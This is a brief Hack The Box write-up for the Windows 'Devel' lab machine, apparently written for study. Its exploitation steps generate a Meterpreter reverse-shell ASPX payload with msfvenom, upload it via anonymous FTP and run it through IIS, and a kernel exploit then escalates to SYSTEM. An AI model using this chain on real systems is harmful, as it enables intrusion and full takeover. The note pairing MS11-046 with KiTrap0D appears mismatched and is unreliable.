---
title: "HTB: Devel"
tags: [htb, windows, easy, iis, ftp, kernel-exploit]
date: 2024-01-01
description: Exploiting anonymous FTP to upload webshells to IIS and using Kernel exploits for privilege escalation.
---

# Hack The Box: Devel

**Difficulty**: Easy  
**OS**: Windows  

## Reconnaissance
- **FTP**: Anonymous login allowed.
- **Web (80)**: Shows the default IIS page.
- **Correlation**: The FTP root is the Web root.

## Exploitation
1.  Generate payload: `msfvenom -p windows/meterpreter/reverse_tcp -f aspx > shell.aspx`.
2.  Upload via FTP: `put shell.aspx`.
3.  Execute: Browse to `http://10.10.10.5/shell.aspx`.

## Privilege Escalation
- **Systeminfo**: OS version is old.
- **Watson/Sherlock**: Vulnerable to MS11-046 (KiTrap0D).
- **Exploit**: Compiled exploit allows escalation to SYSTEM.
